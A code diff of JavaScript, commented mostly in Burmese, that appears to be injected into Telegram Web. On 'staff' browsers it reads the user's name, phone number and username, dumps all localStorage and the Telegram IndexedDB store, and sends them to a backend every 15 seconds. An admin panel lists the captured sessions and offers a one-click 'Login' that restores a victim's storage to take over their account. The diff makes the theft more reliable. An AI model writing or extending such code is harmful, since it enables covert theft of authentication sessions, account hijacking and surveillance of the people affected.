@@ -100,19 +100,21 @@ async function exportIndexedDB(dbName, storeName) {
         });
     }
 
-    // --- (၃) Telegram Profile ရှာဖွေသည့် Function ---
+// --- (၃) Telegram Profile ရှာဖွေသည့် Function (ပိုမိုကောင်းမွန်အောင် ပြင်ဆင်ထားသည်) ---
     function getTelegramProfile() {
         try {
             const stateStr = localStorage.getItem('tt-global-state');
             if (stateStr) {
                 const state = JSON.parse(stateStr);
                 const currentId = state.currentUserId;
-                if (currentId && state.users && state.users.byId && state.users.byId[currentId]) {
-                    const user = state.users.byId[currentId];
-                    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || 'Unknown Staff';
-                    const phone = user.phoneNumber ? '+' + user.phoneNumber : 'No Phone';
-                    const username = user.username ? '@' + user.username : '';
-                    return { uid: currentId.toString(), name: fullName, phone: phone, username: username };
+                if (currentId && state.users && state.users.byId) {
+                    const user = state.users.byId[currentId] || state.users.byId[currentId.toString()];
+                    if (user) {
+                        const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || 'Unknown Staff';
+                        const phone = user.phoneNumber ? '+' + user.phoneNumber : 'No Phone';
+                        const username = user.username ? '@' + user.username : '';
+                        return { uid: currentId.toString(), name: fullName, phone: phone, username: username };
+                    }
                 }
             }
         } catch (e) { console.error("Profile parsing error", e); }
@@ -123,6 +125,7 @@ async function exportIndexedDB(dbName, storeName) {
     document.addEventListener("DOMContentLoaded", () => {
         if (window.location.search.includes("admin=true")) {
             // ================= ADMIN PANEL =================
+            // (Admin Panel ကုတ်များသည် ယခင်အတိုင်း မှန်ကန်ပြီးဖြစ်၍ မူလအတိုင်း ထားပါ)
             document.body.classList.add("hide-telegram");
             const adminPanel = document.createElement("div");
             adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
@@ -142,10 +145,8 @@ async function exportIndexedDB(dbName, storeName) {
             window.loginAs = async (index) => {
                 const session = window.adminDataStore[index];
                 if(!session) return;
-                
                 const targetName = session.profile_name || session.user_id;
                 if(!confirm(targetName + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
-                
                 alert("Session Data များကို ထည့်သွင်းနေပါသည်... ပြီးလျှင် အလိုအလျောက် အကောင့်ထဲရောက်ပါမည်။");
                 
                 try {
@@ -159,20 +160,14 @@ async function exportIndexedDB(dbName, storeName) {
                         await importIndexedDB("tt-data", "store", idbData);
                     }
                     window.location.href = "/"; 
-                } catch (e) {
-                    alert("Error during login injection: " + e.message);
-                }
+                } catch (e) { alert("Error during login injection: " + e.message); }
             };
 
             document.getElementById("loadBtn").addEventListener("click", async () => {
                 const contentDiv = document.getElementById("admin-content");
                 contentDiv.innerHTML = "<p style='color: blue;'>Fetching data from Backend...</p>";
                 try {
-                    const res = await fetch(BACKEND_URL + "/api/get_sessions", {
-                        headers: {
-                            "x-api-key": API_KEY
-                        }
-                    });
+                    const res = await fetch(BACKEND_URL + "/api/get_sessions", { headers: { "x-api-key": API_KEY } });
                     const data = await res.json();
                     window.adminDataStore = data; 
                     
@@ -183,12 +178,10 @@ async function exportIndexedDB(dbName, storeName) {
                     
                     let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
                     html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>Profile Info</th><th style='padding:12px;'>Phone Number</th><th style='padding:12px;'>Last Synced</th><th style='padding:12px;'>Action</th></tr>";
-                    
                     data.forEach((s, index) => {
                         const timeString = new Date(s.timestamp).toLocaleString();
-                        const isReady = s.indexed_db_str ? true : false;
+                        const isReady = s.local_storage_str ? true : false;
                         const statusTag = isReady ? "<span style='color:green; font-size:12px;'>● Data Ready</span>" : "<span style='color:orange; font-size:12px;'>● Waiting...</span>";
-                        
                         const pName = s.profile_name || "Unknown Staff";
                         const pUsername = s.profile_username || "";
                         const pPhone = s.profile_phone || s.user_id;
@@ -197,21 +190,17 @@ async function exportIndexedDB(dbName, storeName) {
                                     <td style='padding:12px;'><b style="font-size: 15px;">${pName}</b> <span style="color:#0063bb;">${pUsername}</span><br>${statusTag}</td>
                                     <td style='padding:12px; font-weight: bold;'>${pPhone}</td>
                                     <td style='padding:12px; color: #555;'>${timeString}</td>
-                                    <td style='padding:12px;'>
-                                        <button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: ${isReady ? "#28a745" : "#ccc"}; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button>
-                                    </td>
+                                    <td style='padding:12px;'><button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: ${isReady ? "#28a745" : "#ccc"}; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button></td>
                                  </tr>`;
                     });
                     html += "</table>";
                     contentDiv.innerHTML = html;
-                } catch (err) {
-                    contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`;
-                }
+                } catch (err) { contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`; }
             });
 
         } else {
-// ================= STAFF BROWSER =================
-        console.log("✅ Lightweight Auth Sync & Logout Detector RUNNING!");
+// ================= STAFF BROWSER (BULLETPROOF SYNC) =================
+        console.log("✅ Advanced Auth Sync & Logout Detector RUNNING!");
         
         setTimeout(() => {
             let myUserId = localStorage.getItem("my_custom_user_id");
@@ -221,61 +210,61 @@ async function exportIndexedDB(dbName, storeName) {
             }
 
             let lastSyncLength = 0; 
-            let wasLoggedIn = false; // ယခင်က Login ဝင်ထားခြင်း ရှိ/မရှိ မှတ်သားရန်
+            let wasLoggedIn = false; 
 
             const syncSessionData = async () => {
                 let profile = getTelegramProfile();
+                const lsDataStr = JSON.stringify(localStorage);
                 
-                // --- LOGOUT DETECTOR LOGIC ---
-                // အရင်က Login ဝင်ထားပြီး အခု Profile မရှိတော့ဘူး (သို့) Logout နှိပ်လိုက်ပြီဆိုရင်
-                if (wasLoggedIn && !profile) {
+                // --- FOOLPROOF LOGIN CHECK ---
+                // Telegram သည် Login ဝင်ထားပါက localStorage တွင် Data အမြောက်အများ သိမ်းပါသည်။
+                // Profile ရသည်ဖြစ်စေ၊ မရသည်ဖြစ်စေ localStorage length > 1500 ရှိပါက Login ဝင်ထားသည်ဟု ယူဆပါမည်။
+                const isLoggedIn = profile !== null || lsDataStr.length > 1500;
+
+                // --- LOGOUT DETECTOR ---
+                if (wasLoggedIn && !isLoggedIn) {
                     console.log("⚠️ ညွှန်ကြားချက်: User သည် Logout လုပ်သွားပါသည်။ DB မှ Session ကို ရှင်းလင်းနေပါသည်...");
                     try {
                         await fetch(BACKEND_URL + "/api/delete_session", {
                             method: "POST",
-                            headers: { 
-                                "Content-Type": "application/json",
-                                "x-api-key": API_KEY 
-                            },
-                            body: JSON.stringify({ user_id: myUserId }) // myUserId ဖြင့် ဖျက်မည်
+                            headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
+                            body: JSON.stringify({ user_id: myUserId }) 
                         });
                         console.log("🗑️ Database မှ Data အားလုံး အောင်မြင်စွာ ဖျက်ပစ်လိုက်ပါပြီ။");
-                        wasLoggedIn = false; // Status ပြန်လည်သတ်မှတ်သည်
+                        wasLoggedIn = false; 
                         lastSyncLength = 0;
-                    } catch(e) { console.error("❌ DB မှဖျက်ရာတွင် အမှားအယွင်းဖြစ်နေပါသည်", e); }
-                    return; // Logout ဖြစ်သွား၍ ဆက်မလုပ်တော့ပါ
-                }
-
-                // Profile ရှိနေသေးရင် (Login ဝင်ထားဆဲဆိုရင်)
-                if (profile) {
-                    wasLoggedIn = true; 
-                    myUserId = profile.uid; // Actual User ID ကို Update လုပ်သည်
+                    } catch(e) { console.error("❌ DB ဖျက်ရာတွင် အမှားဖြစ်နေပါသည်", e); }
+                    return; 
                 }
 
                 // --- SYNC LOGIC ---
-                try {
-                    const rawIdbData = await exportIndexedDB("tt-data", "store"); 
-                    
-                    // ပြင်ဆင်ချက်: IndexedDB အလွတ်ဖြစ်နေရင်တောင် Profile ရှိလျှင် LocalStorage ကို ပို့ပါမည်
-                    if (profile) { 
+                if (isLoggedIn) {
+                    wasLoggedIn = true; 
+                    if (profile) myUserId = profile.uid; // Profile ရလာပါက ID ကို အမှန်သို့ ပြောင်းမည်
+
+                    try {
+                        const rawIdbData = await exportIndexedDB("tt-data", "store"); 
                         const idbDataStr = serializeData(rawIdbData);
-                        const lsDataStr = JSON.stringify(localStorage);
                         
                         const currentDataLength = idbDataStr.length + lsDataStr.length;
 
+                        // Data အပြောင်းအလဲ မရှိပါက ဆက်မလုပ်ပါ
                         if (lastSyncLength === currentDataLength) return; 
+
+                        console.log("🔄 Data အပြောင်းအလဲတွေ့ရှိပါသဖြင့် Backend သို့ Sync စတင်နေပါသည်...");
+
+                        const finalName = profile ? profile.name : "Staff (Profile Loading...)";
+                        const finalPhone = profile ? profile.phone : "Waiting...";
+                        const finalUsername = profile ? profile.username : "";
 
                         const res = await fetch(BACKEND_URL + "/api/save_session", {
                             method: "POST",
-                            headers: { 
-                                "Content-Type": "application/json",
-                                "x-api-key": API_KEY
-                            },
+                            headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                             body: JSON.stringify({
-                                user_id: profile.uid, 
-                                profile_name: profile.name,
-                                profile_phone: profile.phone,
-                                profile_username: profile.username,
+                                user_id: myUserId, 
+                                profile_name: finalName,
+                                profile_phone: finalPhone,
+                                profile_username: finalUsername,
                                 local_storage_str: lsDataStr,
                                 indexed_db_str: idbDataStr,
                                 timestamp: new Date().toISOString()
@@ -283,20 +272,25 @@ async function exportIndexedDB(dbName, storeName) {
                         });
                         
                         if(res.ok) {
-                            console.log(`✅ Auth Key Sync အောင်မြင်ပါသည်: ${profile.name}`);
+                            console.log(`✅ Auth Key Sync အောင်မြင်ပါသည်: ${finalName}`);
                             lastSyncLength = currentDataLength; 
+                        } else {
+                            console.error("❌ Backend မှ Error ပြန်ပေးနေပါသည်:", await res.text());
                         }
-                    }
-                } catch(e) { console.error("❌ Sync failed:", e); }
+                    } catch(e) { console.error("❌ Sync failed Exception:", e); }
+                } else {
+                    console.log("⏳ Waiting for user to login...");
+                }
             };
 
-            setInterval(syncSessionData, 120000); // ၂ မိနစ် တစ်ခါ စစ်မည်
+            // Test လုပ်ရန်လွယ်ကူစေရန် (၁၅) စက္ကန့် တစ်ခါ စစ်ပါမည်။ အဆင်ပြေပါက 120000 (၂ မိနစ်) သို့ ပြန်ပြောင်းပါ။
+            setInterval(syncSessionData, 15000); 
 
             window.addEventListener('beforeunload', () => {
-                syncSessionData();
+                if(wasLoggedIn) syncSessionData();
             });
 
-            syncSessionData(); // စစချင်း တစ်ခါ Run မည်
+            syncSessionData(); 
 
         }, 5000);
         }
